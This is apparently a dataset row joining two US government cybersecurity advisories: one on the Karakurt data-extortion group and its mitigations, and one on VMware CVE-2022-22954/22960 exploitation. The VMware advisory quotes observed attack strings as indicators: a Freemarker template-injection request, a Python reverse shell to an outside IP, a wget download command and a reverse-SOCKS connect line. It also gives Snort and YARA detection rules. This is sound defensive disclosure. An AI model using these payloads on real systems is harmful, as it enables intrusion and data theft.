December 12, 2023: Added language about Cisco VPNs being a possible initial access vector.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1083', 'T1190', 'T1566', 'T1589.001', 'T1567.002', 'TA0043', 'T1566.001', 'T1133', 'T1219', 'T1591.002', 'T1048', 'T1078', 'T1589.002'}","






Actions to take today to mitigate cyber threats from Karakurt ransomware:




Prioritize patching known exploited vulnerabilities.
Train users to recognize and report phishing attempts.
Enforce multifactor authentication.







SUMMARY
The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), the Department of the Treasury (Treasury), and the Financial Crimes Enforcement Network (FinCEN) are releasing this joint Cybersecurity Advisory (CSA) to provide information on the Karakurt data extortion group, also known as the Karakurt Team and Karakurt Lair. Karakurt actors have employed a variety of tactics, techniques, and procedures (TTPs), creating significant challenges for defense and mitigation. Karakurt victims have not reported encryption of compromised machines or files; rather, Karakurt actors have claimed to steal data and threatened to auction it off or release it to the public unless they receive payment of the demanded ransom. Known ransom demands have ranged from $25,000 to $13,000,000 in Bitcoin, with payment deadlines typically set to expire within a week of first contact with the victim.
Karakurt actors have typically provided screenshots or copies of stolen file directories as proof of stolen data. Karakurt actors have contacted victims’ employees, business partners, and clients, with harassing emails and phone calls to pressure the victims to cooperate. The emails have contained examples of stolen data, such as social security numbers, payment accounts, private company emails, and sensitive business data belonging to employees or clients. Upon payment of ransoms, Karakurt actors have provided some form of proof of deletion of files and, occasionally, a brief statement explaining how the initial intrusion occurred.
Prior to January 5, 2022, Karakurt operated a leaks and auction website found at https://karakurt,.,group. The domain and IP address originally hosting the website went offline in the spring 2022. The website is no longer accessible on the open internet, but has been reported to be located elsewhere in the deep web and on the dark web. As of May 2022, the website contained several terabytes of data purported to belong to victims across North America and Europe, along with several “press releases” naming victims who had not paid or cooperated, and instructions for participating in victim data “auctions.”
Download the PDF version of this report:


AA22-152A Karakurt Data Extortion Group
(PDF,       508.81 KB
  )


Click here for STIX. 
TECHNICAL DETAILS
Initial Intrusion
Karakurt does not appear to target any specific sectors, industries, or types of victims. During reconnaissance, Karakurt actors appear to obtain access to victim devices primarily:

By purchasing stolen login credentials,;
Via cooperating partners in the cybercrime community, who provide Karakurt access to already compromised victims; or
Through buying access to already compromised victims via third-party intrusion broker networks,.

Note: Intrusion brokers, or intrusion broker networks, are malicious individual cyber actors or groups of actors who use a variety of tools and skills to obtain initial access to—and often create marketable persistence within—protected computer systems. Intrusion brokers then sell access to these compromised computer systems to other cybercriminal actors, such as those engaged in ransomware, business email compromise, corporate and government espionage, etc.



Some Karakurt victims have reported that initial intrusion may have occurred via compromised Cisco AnyConnect VPN user accounts. Many of these victims reported multi-factor authentication was not enforced for their Cisco AnyConnect VPN platforms.
Common intrusion vulnerabilities exploited for initial access,TA001, in Karakurt events include the following:

Outdated SonicWall SSL VPN appliances, are vulnerable to multiple recent CVEs,
Log4j “Log4Shell” Apache Logging Services vulnerability (CVE-2021-44228),
Phishing and spearphishing,
Malicious macros within email attachments,
Stolen virtual private network (VPN) or Remote Desktop Protocol (RDP) credentials,
Outdated Fortinet FortiGate SSL VPN appliances,/firewall appliances, are vulnerable to multiple recent CVEs,
Outdated and/or unserviceable Microsoft Windows Server instances,
Outdated and/or unpatched Cisco AnyConnect software and hardware appliances.

Network Reconnaissance, Enumeration, Persistence, and Exfiltration
Upon developing or obtaining access to a compromised system, Karakurt actors deploy Cobalt Strike beacons to enumerate a network, install Mimikatz to pull plain-text credentials, use AnyDesk to obtain persistent remote control, and utilize additional situation-dependent tools to elevate privileges and move laterally within a network.
Karakurt actors then compress (typically with 7zip) and exfiltrate large sums of data—and, in many cases, entire network-connected shared drives in volumes exceeding 1 terabyte (TB)—using open source applications and File Transfer Protocol (FTP) services, such as Filezilla and cloud storage services including rclone and Mega.nz,.
Extortion
Following the exfiltration of data, Karakurt actors present the victim with ransom notes by way of “readme.txt” files, via emails sent to victim employees over the compromised email networks, and emails sent to victim employees from external email accounts. The ransom notes reveal the victim has been hacked by the “Karakurt Team” and threaten public release or auction of the stolen data. The instructions include a link to a TOR URL with an access code. Visiting the URL and inputting the access code open a chat application over which victims can negotiate with Karakurt actors to have their data deleted.
Karakurt victims have reported extensive harassment campaigns by Karakurt actors in which employees, business partners, and clients receive numerous emails and phone calls warning the recipients to encourage the victims to negotiate with the actors to prevent the dissemination of victim data. These communications often included samples of stolen data—primarily personally identifiable information (PII), such as employment records, health records, and financial business records.
Victims who negotiate with Karakurt actors receive “proof of life,” such as screenshots showing file trees of allegedly stolen data or, in some cases, actual copies of stolen files. Upon reaching an agreement on the price of the stolen data with the victims, Karakurt actors provided a Bitcoin address—usually a new, previously unused address—to which ransom payments could be made.
Upon receiving the ransom, Karakurt actors provide some form of alleged proof of deletion of the stolen files, such as a screen recording of the files being deleted, a deletion log, or credentials for a victim to log into a storage server and delete the files themselves.
Although Karakurt’s primary extortion leverage is a promise to delete stolen data and keep the incident confidential, some victims reported Karakurt actors did not maintain the confidentiality of victim information after a ransom was paid. Note: The U.S. government strongly discourage the payment of any ransom to Karakurt threat actors, or any cyber criminals promising to delete stolen files in exchange for payments.
In some cases, Karakurt actors have conducted extortion against victims previously attacked by other ransomware variants. In such cases, Karakurt actors likely purchased or otherwise obtained previously stolen data. Karakurt actors have also targeted victims at the same time these victims were under attack by other ransomware actors. In such cases, victims received ransom notes from multiple ransomware variants simultaneously, suggesting Karakurt actors purchased access to a compromised system that was also sold to another ransomware actor.
Karakurt actors have also exaggerated the degree to which a victim had been compromised and the value of data stolen. For example, in some instances, Karakurt actors claimed to steal volumes of data far beyond the storage capacity of compromised systems or claimed to steal data that did not belong to the victim.
Indicators of Compromise





MITRE ATT&CK TACTICS AND TECHNIQUES
See table 1 for all referenced threat actor tactics and techniques in this advisory, as well as corresponding detection and/or mitigation recommendations. For additional mitigations, see the Mitigations section.

MITIGATIONS

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).
Implement network segmentation and maintain offline backups of data to ensure limited interruption to the organization.
Regularly back up data and password protect backup copies offline. Ensure copies of critical data are not accessible for modification or deletion from the system where the data resides.
Install and regularly update antivirus software on all hosts and enable real time detection.
Install updates/patch operating systems, software, and firmware as soon as updates/patches are released.
Review domain controllers, servers, workstations, and active directories for new or unrecognized accounts.
Audit user accounts with administrative privileges and configure access controls with least privilege in mind. Do not give all users administrative privileges.
Disable unused ports.
Consider adding an email banner to emails received from outside your organization.
Disable hyperlinks in received emails.
Enforce multi-factor authentication.
Use the National Institute for Standards and Technology’s (NIST’s) standards for developing and managing password policies.

Use longer passwords consisting of at least 8 characters and no more than 64 characters in length;

Store passwords in hashed format using industry-recognized password managers;
Add password user “salts” to shared login credentials;
Avoid reusing passwords;
Implement multiple failed login attempt account lockouts;
Disable password “hints”;
Refrain from requiring password changes more frequently than once per year.
Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.




Only use secure networks and avoid using public Wi-Fi networks. Consider installing and using a VPN.
Focus on cyber security awareness and training. Regularly provide users with training on information security principles and techniques as well as overall emerging cybersecurity risks and vulnerabilities (i.e., ransomware and phishing scams).

RESOURCES

For additional resources related to the prevention and mitigation of ransomware, visit Stopransomware.gov as well as the CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide and NIST’s Data Integrity: Detecting and Responding to Ransomware and Other Destructive Events. Stopransomware.gov is the U.S. government’s one-stop location for resources to tackle ransomware more effectively.
CISA’s Ransomware Readiness Assessment is a no-cost self-assessment based on a tiered set of practices to help organizations better assess how well they are equipped to defend and recover from a ransomware incident.
CISA offers a range of no-cost cyber hygiene services to help critical infrastructure organizations assess, identify, and reduce their exposure to threats, including ransomware.
Financial Institutions must also ensure compliance with any applicable Bank Secrecy Act requirements, including suspicious activity reporting obligations. Indicators of Compromise, such as suspicious email addresses, file names, hashes, domains, and IP addresses, can be provided under Item 44 of the Suspicious Activity Report (SAR) form. For more information on mandatory and voluntary reporting of cyber events via suspicious activity reports (SARs), see FinCEN Advisory FIN-2016-A005, Advisory to Financial Institutions on Cyber-Events and Cyber-Enabled Crime, October 25, 2016, and FinCEN Advisory FIN-2021-A004, Advisory on Ransomware and the Use of the Financial System to Facilitate Ransom Payments, November 8, 2021, which updates FinCEN Advisory FIN-2020-A006.
The U.S. Department of State’s Rewards for Justice (RFJ) program offers a reward of up to $10 million for reports of foreign government malicious activity against U.S. critical infrastructure. See the RFJ website for more information and how to report information securely.

VERSION HISTORY
June 01, 2022: Initial version.
June 02, 2022: Added STIX file.
December 12, 2023: Added language about Cisco VPNs being a possible initial access vector.






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-152a
48,"




Summary

Update June 2, 2022:
This Cybersecurity Advisory (CSA) has been updated with additional indicators of compromise (IOCs) and detection signatures, as well as tactics, techniques, and procedures (TTPs) from trusted third parties. 
Update End
The Cybersecurity and Infrastructure Security Agency (CISA) is releasing this CSA to warn organizations that malicious cyber actors, likely advanced persistent threat (APT) actors, are exploiting CVE-2022-22954 and CVE-2022-22960 separately and in combination. These vulnerabilities affect certain versions of VMware Workspace ONE Access, VMware Identity Manager (vIDM), VMware vRealize Automation (vRA), VMware Cloud Foundation, and vRealize Suite Lifecycle Manager. Exploiting these vulnerabilities permits malicious actors to trigger a server-side template injection that may result in remote code execution (RCE) (CVE-2022-22954) or escalation of privileges to root (CVE-2022-22960). 
VMware released updates for both vulnerabilities on April 6, 2022, and, according to a trusted third party, malicious cyber actors were able to reverse engineer the updates to develop an exploit within 48 hours and quickly began exploiting the disclosed vulnerabilities in unpatched devices. CISA was made aware of this exploit a week later and added CVE-2022-22954 and CVE-2022-22960 to its catalog of Known Exploited Vulnerabilities on April 14 and April 15, respectively. In accordance with Binding Operational Directive (BOD) 22-01, Reducing the Significant Risk of Known Exploited Vulnerabilities, federal agencies were required to apply updates for CVE-2022-22954 and CVE-2022-22960 by May 5, and May 6, 2022, respectively
Note: based on this activity, CISA expects malicious cyber actors to quickly develop a capability to exploit newly released vulnerabilities CVE-2022-22972 and CVE-2022-22973 in the same impacted VMware products. In response, CISA has released, Emergency Directive (ED) 22-03 Mitigate VMware Vulnerabilities, which requires emergency action from Federal Civilian Executive Branch agencies to either immediately implement the updates in VMware Security Advisory VMSA-2022-0014 or remove the affected software from their network until the updates can be applied.
CISA has deployed an incident response team to a large organization where the threat actors exploited CVE-2022-22954. Additionally, CISA has received information—including IOCs—about observed exploitation at multiple other large organizations from trusted third parties.
This CSA provides IOCs and detection signatures from CISA as well as from trusted third parties to assist administrators with detecting and responding to this activity. 
Update June 2, 2022:
This CSA also provides TTPs of this activity from trusted third parties to assist administrators with detecting and responding to this activity. 
Update End
Due to the rapid exploitation of these vulnerabilities, CISA strongly encourages all organizations with internet-facing affected systems—that did not immediately apply updates—to assume compromise and initiate threat hunting activities using the detection methods provided in this CSA. If potential compromise is detected, administrators should apply the incident response recommendations included in this CSA.
Download the PDF version of this report (pdf, 349kb).
For a downloadable copy of IOCs, see AA22-138B.stix. 

Technical Details

CISA has deployed an incident response team to a large organization where the threat actors exploited CVE-2022-22954. Additionally, CISA has received information about observed exploitation of CVE-2022-22954 and CVE-2022-22960 by multiple threat actors at multiple other large organizations from trusted third parties.

CVE-2022-22954 enables an actor with network access to trigger a server-side template injection that may result in RCE. This vulnerability affects the following products:[1]

VMware Workspace ONE Access, versions 21.08.0.1, 21.08.0.0, 20.10.0.1, 20.10.0.0
vIDM versions 3.3.6, 3.3.5, 3.3.4, 3.3.3
VMware Cloud Foundation, 4.x
vRealize Suite LifeCycle Manager, 8.x


CVE-2022-22960 enables a malicious actor with local access to escalate privileges to root due to improper permissions in support scripts. This vulnerability affects the following products:[2]

VMware Workspace ONE Access, versions 21.08.0.1, 21.08.0.0, 20.10.0.1, 20.10.0.0
vIDM, versions 3.3.6, 3.3.5, 3.3.4, 3.3.3
vRA, version 7.6 
VMware Cloud Foundation, 3.x, 4.x, 
vRealize Suite LifeCycle Manager, 8.x



According to trusted third-party reporting, threat actors may chain these vulnerabilities. At one compromised organization, on or around April 12, 2022, an unauthenticated actor with network access to the web interface leveraged CVE-2022-22954 to execute an arbitrary shell command as a VMware user. The actor then exploited CVE-2022-22960 to escalate the user’s privileges to root. With root access, the actor could wipe logs, escalate permissions, and move laterally to other systems. 
Update June 2, 2022:
For more information about this compromised organization, see the Victim 1 section.
Update End
Threat actors have dropped post-exploitation tools, including the Dingo J-spy webshell, a publicly available webshell that includes command execution, a file manager, a database manager, and a port scanner. During incident response activities, CISA observed, on or around April 13, 2022, threat actors leveraging CVE-2022-22954 to drop the Dingo J-spy webshell. Around the same period, a trusted third party observed threat actors leveraging CVE-2022-22954 to drop the Dingo J-spy webshell at one other organization. According to the third party, the actors may have also dropped the Dingo J-spy webshell at a third organization. Note: analysis of the first compromise and associated malware is ongoing, and CISA will update information about this case as we learn more.
Update June 2, 2022:
The following sections include additional information, including IOCs and TTPs, from trusted third parties about two confirmed compromises. See the appendix for TTPs in this CSA mapped to the MITRE ATT&CK for Enterprise framework.
Victim 1 
The trusted third party assesses that multiple threat actors (referred to as Threat Actor 1 [TA1] and Threat Actor 2 [TA2]) gained access to a public-facing server running VMWare Workspace ONE Access. TA1 downloaded a malicious shell script, which they used to collect and exfiltrate sensitive data. TA2 interacted with the server (without automation or scripts) and installed multiple webshells and a reverse secure socket (SOCKS) proxy.
Threat Actor 1
On April 12, TA1 exploited CVE 2022-22954 [T1203] to download [T1105] a malicious shell script [T1059] from https://20.232.97[.]189/up/80b6ae2cea.sh. 
TA1 first targeted Freemarker—a legitimate application that allows for customized notifications by creating templates—to send the following customized GET request URI to the compromised server [T1071.001]:
GET /catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22cat%20/usr/local/horizon/conf/system-config.properties%22%29%7DHTTP/1.1
The GET request resulted in the server downloading the malicious shell script, 80b6ae2cea[.]sh, to VMware Workspace ONE Access directory /usr/local/horizon/scripts/. TA1 then chained CVE 2022-22960 to the initial exploit to run the shell script with root privileges ([T1068], [TA0004]). The script was executed with the SUDO command.
The script, which contained VMware Workspace ONE Access directory paths and file locations, was developed for data exfiltration [TA0010]. The malicious script collected [TA0009] sensitive files–including user names, passwords, master keys, and firewall rules–and stored them in a “tar ball” (a “tar ball” is a compressed and zipped file used by threat actors for collection and exfiltration) [T1560]. The tar ball was located in a VMWare Workspace ONE Access directory: /opt/vmware/horizon/workspace/webapps/SAAS/horizon/images/.
The malicious script then deleted evidence of compromise [TA0005] by modifying logs to their original state and deleting files [T1070]. TA1 deleted many files and logs, including fd86ald0.pem,  localhost_access logs, logs associated with the VMWare Horizon application, and greenbox logs for the date of activity (April 12).  
Note: CISA received a similar malicious Bash script for analysis from a trusted third party at a different known compromise. See Victim 2 section for more information.
On April 12, TA1 also downloaded jtest.jsp, a JSP webshell, to the server’s web directory /SAAS/Horizon/js-lib/ from IP address 186.233.187[.]245.
TA1 returned to the server on April 12 to collect sensitive data stored in the “tar ball” by GET request.
Threat Actor 2
On April 13 and 14, TA2 sent many GET requests to the server exploiting—or attempting to exploit—CVE 2022-22954 to obtain RCE, upload binaries, and upload webshells [T1505.003] for persistence [TA0003].

On April 13, TA2 attempted to download a webshell app.jsp (MD5 4cd8366345ad4068feca4d417738b4bd) from IP address 51.79.171[.]53. app.jsp is a publicly available [T1588.001] webshell known as Godzilla.
On April 13, TA2 downloaded a JSP webshell (MD 5 F8FF5C72E8FFA2112B01802113148BD1) from http://84.38.133[.]149/img/icon1.gif.
On April 13, TA2 sent thousands of Unix commands [T1059.004] from IP address 84.38.133[.]149, some of which enabled TA2 to view /etc/passwd and /etc/shadow password files ([TA0006], [T1003.008]). The Unix commands included whoami, id, and cat.

The trusted third party found two copies of the Dingo J-spy webshell (MD5 5b0bfda04a1e0d8dcb02556dc4e56e6a) in web directories: horizon_all.jsp was in the /opt/vmware/horizon/workspace/webapps/SAAS/horizon/portal/ web directory and jquery.jsp was in the /webapps/cas/static/ directory. The third party was unable to determine how and when the webshells were created. TA2 used POST requests to communicate with the Dingo J-spy webshells. The commands and output were encrypted with an XOR key [T1573.001].
On April 14, TA2 downloaded a reverse SOCKS proxy [T1090]. TA2 first sent a GET request with the CHMOD command to change the permissions of .tmp12865xax, a hidden file in the /tmp directory [T1222.002]. The actor then downloaded a binary (MD5  dc88c5fe715b5f706f9fb92547da948a) from https://github[.]com/kost/revsocks/releases/download/v1.1.0/revsocks_linux_amd64. The binary is a reverse socks5 tunneling binary with TLS/SSL support and connects to https://149.248.35[.]200.sslip.io.
Additional Threat Actor Activity
The trusted third party observed additional threat actor activity that does not seem to be related to TA1 or TA2. On 13 April, IP address 172.94.89[.]112 attempted to connect a reverse shell on the compromised server to IP Address 100.14.239[.]83 on port 5410. The threat actor used the following command:
freemarker.template.utility.Execute\""?new()(\""/usr/bin/python3.7 -c  \\'importsocket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s. connect((\\\""100[.]14[.]239[.]83\\\"",5410));os.dup2(s.fileno(),0);  os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\""/usr/bin/sh\\\"",\\\""- i\\\""]);\\'\"")}  
Victim 2 
CISA received a related malicious Bash script for analysis from a trusted third party. The analyzed script, deployed on or around April 12, exploits CVE 2022-22960 and allows a Horizon user to escalate privileges and execute commands and scripts as a superuser (sudo). The Bash script also allows the user to collect network information and additional information.
The script overwrites the publishCaCert.hzn script on fd86ald0.pem file and executes commands that compress a list of files containing information such as network interface configuration, list of users, passwords, masterkeys, hosts, and domains to a TAR archive. The TAR archive, located in a VMWare Workspace ONE Access directory, /opt/vmware/horizon/workspace/webapps/SAAS/horizon/images/, is assigned read and write permissions to the Horizon web user and read to all users.  
The malicious script deletes evidence of compromise by overwriting publishCaCert.hzn with fd86ald0.pem and then removing fd86ald0.pem.
The trusted third party observed the following IPs downloading, executing, and checking the bash script.

45.72.112[.]245
115.167.53[.]141
191.102.179[.]197
209.127.110[.]126
45.72.85[.]172
192.241.67[.]12

The trusted third party observed the following additional malicious IPs:

20.232.97[.]189 – used for command for control [TA0011]
194.31.98[.]141 – attempted to download MoneroOcean miner from Github
8.45.41[.]114 – ran cat on a number of files in /usr/local/horizon/conf
85.203.36[.]66 – attempted to pull down a JSP webshell from http://84.38.133[.]149/img/icon.gif

Update End
Detection Methods
Signatures
Note: servers vulnerable to CVE-2022-22954 may use Hypertext Transfer Protocol Secure (HTTPS) to encrypt client/server communications. Secure Sockets Layer (SSL)/Transport Layer Security (TLS) decryption can be used as a workaround for network-based detection and threat hunting efforts.
The following CISA-created Snort signature may detect malicious network traffic related to exploitation of CVE-2022-22954:
alert tcp any any -> any $HTTP_PORTS (msg:""VMware:HTTP GET URI contains '/catalog-portal/ui/oauth/verify?error=&deviceUdid=':CVE-2022-22954""; sid:1; rev:1; flow:established,to_server; content: ""GET""; http_method; content:""/catalog-portal/ui/oauth/verify?error=&deviceUdid=""; http_uri; reference:cve,2022-22954; reference:url,github.com/sherlocksecurity/VMware-CVE-2022-22954;
reference:url,github.com/tunelko/CVE-2022-22954-PoC/blob/main/CVE-2022-22954.py; priority:2; metadata:service http;)
The following third-party Snort signature may detect exploitation of VMware Workspace ONE Access server-side template injection:
10000001alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""Workspace One Serverside Template Injection"";content:""GET""; http_method; content:""freemarker.template.utility.Execute"";nocase; http_uri; priority:1; sid:;rev:1;)
Update June 2, 2022:
alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""Workspace One Serverside  Template Injection"";content:""GET""; http_method;  content:""freemarker.template.utility.Execute"";nocase; http_uri; priority:1; sid:100000001;rev:1;)  
Update End
The following third-party YARA rule may detect unmodified instances of the Dingo J-spy webshell on infected hosts:
rule dingo_jspy_webshell
{
strings:
$string1 = ""dingo.length""
$string2 = ""command = command.trim""
$string3 = ""commandAction""
$string4 = ""PortScan""
$string5 = ""InetAddress.getLocalHost""
$string6 = ""DatabaseManager""
$string7 = ""ExecuteCommand""
$string8 = ""var command = form.command.value""
$string9 = ""dingody.iteye.com""
$string10 = ""J-Spy ver""
$string11 = ""no permission ,die""
$string12 = ""int iPort = Integer.parseInt""
condition:
filesize < 50KB and 12 of ($string*)
}
Note: the Dingo J-spy webshell is an example of post-exploitation tools that actors have used. Administrators should examine their network for any sign of post-exploitation activity.
Update June 2, 2022:
The following third-party YARA rule may detect unmodified instances of the Godzilla webshell on infected hosts:
rule Godzilla_Webshell  
{   
 strings:  
 $string1 = ""TomcatListenerMemShellFromThread""  
 $string2 = ""String xc =""  
 $string3 = ""String pass =""  
 $string4 = ""ServletRequestListener""  
 $string5 = ""cmds = new String""  
 $string6 = ""cmd""  
 $string7 = ""bin/bash""  
 $string8 = ""getInputStream""  
 $string9 = ""javax.crypto.Cipher c = javax.crypto.Cipher.getInstance""  
 $string10 = ""godzilla""  
 condition:  
 filesize < 20KB and 10 of ($string*)  
} 
The following third-party YARA rule may detect unmodified instances of the TomCat JSP webshell on infected hosts:
rule Tomcatjsp_Webshell  
{  
 strings:  
 $string1 = ""ExecShellCmd""  
 $string2 = ""stCommParams""  
 $string3 = ""nKeyOffset = EncryptData""  
 $string4 = ""InputStream is = process.getInputStream""  
 $string5 = ""Process process = Runtime.getRuntime""  
 $string6 = ""ExecBinary""  
 $string7 = ""byte bzKey""  
 $string8 = ""nKeyOffset++""  
 $string9 = ""HttpServletRequest request, HttpServletResponse response""   $string10 = ""connect_test cmd""  
 $string11 = ""exec cmd""  
 $string12 = ""file upload""  
 condition:  
 filesize < 25KB and 12 of ($string*)  
} 
 
The following third-party YARA rule may detect unmodified instances of the reverse SOCKS proxy on infected hosts.
rule reversesocks_tool  
{  
 md5 = ""dc88c5fe715b5f706f9fb92547da948a""   strings:  
 $string1 = ""revsocks""  
 $string2 = ""-connect""  
 $string3 = ""client:8080 -pass test""  
 $string4 = ""RSA TESTING KEY""  
 $string5 = ""SETTINGS_MAX_CONCURRENT_STREAMS""   $string6 = ""Start on the server:""  
 $string7 = ""closing connection""  
 $string8 = ""socks 127.0.0.1:1080""  
 $string9 = ""revsocks -listen :8080""  
 condition:  
 uint16(0) == 0x457F and filesize < 6MB and 8 of ($string*)  } 
Update End
Behavioral Analysis and Indicators of Compromise
Administrators should conduct behavioral analysis on root accounts of vulnerable systems by: 

Using the indicators listed in table 1 to detect potential malicious activity.
Reviewing systems logs and gaps in logs.
Reviewing abnormal connections to other assets.
Searching the command-line history.
Auditing running processes.
Reviewing local user accounts and groups.  
Auditing active listening ports and connections.

Table 1: Third-party IOCs for Exploitation of CVE-2022-22954 and CVE-2022-22960 
Used around April 12–14, 2022 (Updated June 2, 2022)
 



IP Addresses




Indicator
Comment


136.243.75[.]136 
On or around April 12, 2022, malicious cyber actors may have used this German-registered IP address to conduct the activity. However, the actors may have used the Privax HMA VPN client to conduct operations. 


Update June 2, 2022:


84.38.133[.]149
A threat actor used this IP for command and control.


186.233.187[.]245
This IP attempted to upload webshells.  The user agent string for this IP was Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0 


212.227.198[.]95
 


20.232.97[.]189
A threat actor used this IP for command and control (see Victim 1 and Victim 2 sections). 


160.20.145[.]225
 


149.248.35[.]200
 


100.14.239[.]83
A threat actor attempted to connect a reverse shell on the compromised server to this IP address.


51.79.171[.]53
This IP address attempted to upload a webshell


172.94.89[.]112
This IP address attempted to have a reverse shell on the compromised server to connect back to IP Address 100.14.239[.]83 on port 5410.


83.84.74[.]155 
 


194.31.98[.]141
This IP attempted to download MoneroOcean miner from Github.


8.45.41[.]114
This IP ran cat on a number of files in /usr/local/horizon/conf.


85.203.36[.]66 
This IP attempted to pull down a JSP webshell from http://84.38.133[.]149/img/icon.gif.


45.72.112[.]245
These IPs downloaded, executed, and checked a malicious bash script.


115.167.53[.]141


191.102.179[.]197


209.127.110[.]126


45.72.85[.]172


192.241.67[.]12


Domains


https://149.248.35[.]200.sslip[.]io
 


sslip[.]io  
 


https://github[.]com/kost/revsocks/releases/download
 


Update End


Scanning, Exploitation Strings, and Commands Observed


catalog-portal/ui/oauth/verify  
 



catalog 
portal/ui/oauth/verify?error=&deviceUdid=${""freemarker.template.utility.Execute""?new()(""cat  /etc/hosts"")} 

 



/catalog 
portal/ui/oauth/verify?error=&deviceUdid=${""freemarker.template.utility.Execute""?new()(""wget  -U ""Hello 1.0"" -qO - http://[REDACTED]/one"")} 

 


freemarker.template.utility.Execute

Search for this function in: 
/opt/vmware/horizon/workspace/logs/greenbox_web.log
Update June 2, 2022:
or /opt/vmware/horizon/workspace/logs/greenbox_web.log*
freemarker.template.utility.Execute may be legitimate but could also indicate malicious shell commands. You should URL decode the logs before searching for freemarker.template.utility.Execute.



 
Update End


/opt/vmware/certproxy/bing/certproxyService.sh 
Check for this command being placed into the script; CVE-2022-22960 allows a user to write to it and be executed as root.


/horizon/scripts/exportCustomGroupUsers.sh 
Check for this command being placed into the script; CVE-2022-22960 allows a user to write to it and be executed as root.


/horizon/scripts/extractUserIdFromDatabase.sh  
Check for this command being placed into the script; CVE-2022-22960 allows a user to write to it and be executed as root.


Update June 2, 2022:


.tmp12865xax2 -connect 149[.]248[.]35[.]200.sslip[.]io:443 -pass  OneTwoOne123!"" (Bash)
 


Update End
 


Files



horizon.jsp  
June 2, 2022 Update:
(jquery.jsp)
5b0bfda04a1e0d8dcb02556dc4e56e6a (MD 5)
Update End

Found in /usr/local/horizon/workspace/webapps/SAAS/horizon/js-lib: 


Update June 2, 2022:


jest.jsp
 


74805fa847acac6adc896968421ec9e (MD 5)
 


dc88c5fe715b5f706f9fb92547da948a (MD 5)
Reverse SOCKS proxy


Update End


Webshells



jspy  
Update June 2, 2022:
C509282c94b504129ac6ef168a3f08a8 (MD 5)
Update End

 



godzilla 
Update June 2, 2022:
app.jsp 
4cd8366345ad4068feca4d417738b4bd (MD 5)
Update End

 


tomcatjsp  
 



 
Update May 25, 2022: see Palo Alto Networks Unit 42 Threat Brief: VMware Vulnerabilities Exploited in the Wild (CVE-2022-22954 and Others) for additional IOCs to detect possible exploitation or compromise. Note: due to the urgency to share this information, CISA has not yet validated this content.
Incident Response
If administrators discover system compromise, CISA recommends they:

Immediately isolate affected systems. 
Collect and review relevant logs, data, and artifacts.
Consider soliciting support from a third-party incident response organization to provide subject matter expertise, ensure the actor is eradicated from the network, and avoid residual issues that could enable follow-on exploitation.
Report incidents to CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870).


Mitigations

CISA recommends organizations update impacted VMware products to the latest version or remove impacted versions from organizational networks. CISA does not endorse alternative mitigation options. As noted in ED 22-03 Mitigate VMware Vulnerabilities, CISA expects malicious cyber actors to quickly develop a capability to exploit newly released vulnerabilities CVE-2022-22972 and CVE-2022-22973 in the same impacted VMware products. ED 22-03 directs all Federal Civilian Executive Branch agencies to enumerate all instances of impacted VMware products and deploy updates in VMware Security Advisory VMSA-2022-0014 or to remove the affected software from the agency network until the updates can be applied.
Resources

ED 22-03 Mitigate VMware Vulnerabilities
VMware Security Advisory VMSA-2022-0011
VMware Security Advisory VMSA-2022-0014
Update May 25, 2022: Palo Alto Networks Unit 42 Threat Brief: VMware Vulnerabilities Exploited in the Wild (CVE-2022-22954 and Others)

Contact Information 
CISA encourages recipients of this CSA to report incidents to CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870)
References
[1] VMware Security Advisory VMSA-2022-0011
[2] Ibid
Update June 2, 2022:
Appendix: Mitre  Att&ck TTPS
Threat actors and their malware have used the TTPs in table 1 when exploiting CVE-2022-22954 and/or CVE-2022-22960 and conducting related activity. See the ATT&CK for Enterprise framework for all referenced threat actor tactics and techniques.
Table 2: MITRE ATT&CK TTPs



Tactic 
Technique




Resource Development [TA0042]
Obtain Capabilities: Malware [T1588.001]


Execution [TA0002]
Command and Scripting Interpreter [T1059]


Command and Scripting Interpreter: Unix Shell [T1059.004] 


Exploitation for Client Execution  [T1203]


Persistence  [TA0003]
Server Software Component: Web Shell  [T1505.003] 


Privilege Escalation [TA0004]
Exploitation for Privilege Escalation [T1068]


Defense Evasion [TA0005] 

File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification
[T1222.002]
Indicator Removal on Host [T1070]



Credential Access [TA0006]


OS Credential Dumping: /etc/passwd and /etc/shadow
[T1003.008]




Collection [TA0009]

Archive Collected Data [T1560]



Command and Control [TA0011]
Application Layer Protocol: Web Protocols [T1071.001]


Encrypted Channel: Symmetric Cryptography  [T1573.001]


Proxy [T1090]


Ingress Tool Transfer [T1105]


Exfiltration [TA0004]
 



Update End

References

[1] VMware Security Advisory VMSA-2022-0011
[2] Ibid

Revisions

Initial Version: May 18, 2022|May 25, 2022: Added Industry Resource|June 2, 2022: Added Detection Signatures, IOCs, and TTPs






This product is provided subject to this Notification and this Privacy & Use policy.


","{'TA0003', 'T1505.003', 'T1222.002', 'TA0010', 'T1059.004', 'T1560', 'TA0005', 'T1573.001', 'T1203', 'T1003.008', 'TA0006', 'T1068', 'T1105', 'TA0011', 'T1090', 'T1070', 'T1588.001', 'TA0002', 'T1059', 'TA0009', 'T1071.001', 'TA0042', 'TA0004'}","




Summary

Update June 2, 2022:
This Cybersecurity Advisory (CSA) has been updated with additional indicators of compromise (IOCs) and detection signatures, as well as tactics, techniques, and procedures (TTPs) from trusted third parties. 
Update End
